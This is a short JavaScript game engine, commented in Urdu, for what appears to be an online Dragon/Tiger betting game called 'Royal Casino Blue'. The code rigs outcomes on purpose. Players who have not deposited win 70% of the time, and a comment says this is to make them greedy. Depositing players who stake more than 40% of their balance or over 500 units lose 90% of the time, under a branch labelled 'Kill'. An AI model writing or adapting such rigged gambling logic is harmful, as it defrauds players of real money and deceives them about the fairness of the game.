// Royal Casino Blue - Automated Winning/Losing Logic
const GameEngine = (userBetAmount, betOn, userBalance, isDeposited) => {
    
    // 1. فری یوزر لاجک (جنہوں نے ڈپازٹ نہیں کیا)
    if (!isDeposited) {
        // انہیں 70% بار جتوائیں تاکہ وہ لالچ میں آئیں
        return Math.random() < 0.7 ? betOn : (betOn === 'D' ? 'T' : 'D');
    }

    // 2. ڈپازٹ والے یوزر کے لیے "Kill" لاجک
    // اگر یوزر اپنے بیلنس کا 40% سے زیادہ ایک ہی بار میں لگا دے
    const betPercentage = (userBetAmount / userBalance) * 100;

    if (betPercentage > 40 || userBetAmount > 500) {
        // بڑی رقم پر 90% ہارنے کا چانس
        console.log("High Bet Detected: Triggering System Win");
        return Math.random() < 0.1 ? betOn : (betOn === 'D' ? 'T' : 'D');
    }

    // 3. نارمل گیم پلے (50/50 چانس)
    return Math.random() < 0.5 ? 'D' : 'T';
};

export default GameEngine;
